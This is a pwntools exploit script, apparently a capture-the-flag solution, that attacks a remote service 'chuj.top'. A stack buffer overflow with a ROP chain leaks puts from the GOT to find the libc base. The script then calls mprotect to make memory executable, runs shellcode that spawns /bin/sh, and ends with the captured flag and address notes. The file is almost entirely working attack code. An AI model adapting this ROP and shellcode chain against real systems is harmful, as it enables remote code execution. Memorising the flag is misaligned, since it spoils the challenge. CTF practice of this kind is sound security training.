#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']


p = remote('chuj.top', '35450')
# p = process('./a')
elf = ELF('./a')
libc = ELF("./libc-2.31.so")
# libc = ELF("./libpthread-2.31.so")


def debug():
    gdb.attach(p)
    pause()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']

rdi_addr = 0x401363
ret_addr = 0x40101a
payload = b'a'*40 + p64(0x3030303030303030) + p64(0) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(0x4011D6)
# debug()
payload = payload.ljust(2096+64,b'0') # 2160
p.sendline(payload)


# payload = b'a'*40 + p64(canary) + p64(0) + p64(rdi_addr) + p64(read_got) + p64(puts_plt) + p64(0x4011D6)
#
# p.sendline(payload)
# 2096+8
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc_addr = puts_addr-libc.symbols['puts']
log.success('libc_addr: ' + hex(libc_addr))
libc.address = puts_addr-libc.symbols['puts']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.symbols['system']
log.success('system_addr: ' + hex(system_addr))
#
#
rop1 = 0x40135A
rop2 = 0x401340
bss = 0x404080
mprotect_addr = libc.symbols['mprotect']
rdi_addr = 0x26b72 + libc_addr
rsi_addr = 0x27529 + libc_addr
rdx_r12_addr = 0x11c371 + libc_addr
stack_addr = libc_addr - 0x803000
code_addr = libc_addr - 0X40A0
code = shellcraft.sh()

# one_addr = 0xe6c7e+libc.address
# payload = b'a'*40 + p64(0x6161616161616161) + p64(0) + p64(one_addr) + p64(0) + p64(1) + p64(0) + p64(bss) + p64(0x10) + p64(read_got) + p64(rop2) + b"\x00"*56 + p64(rdi_addr) + p64(bss) +p64(system_addr)
payload = b'a'*40 + p64(0x3030303030303030) + p64(0) + p64(rdi_addr) + p64(stack_addr) + p64(rsi_addr) + p64(0x803000) + p64(rdx_r12_addr) + p64(7) + p64(0) + p64(mprotect_addr) + p64(code_addr) + asm(code)

# payload = b'a'*40 + p64(0x3030303030303030) + p64(0) + p64(rop1) + p64(0) + p64(1) + p64(0) + p64(bss) + p64(0x10) + p64(read_got) + p64(rop2) + b"\x00"*56 + p64(rdi_addr) + p64(bss) + p64(system_addr)


p.sendline(payload)

p.interactive()

# hgame{d0~y0u~kn0W~tLs-AnD-how~5t@Ck_BE|Ng-CreaTed_nOw?}

#7fe3d5439000
#7fe3d5434f58

#0x7f0ef28d2000

#0x7f39fca86000
#0x7f39fc283000 len = 0x803000
#803000

#0x7f21a78be000
#0x7f21a78b9f60
#0X40A0

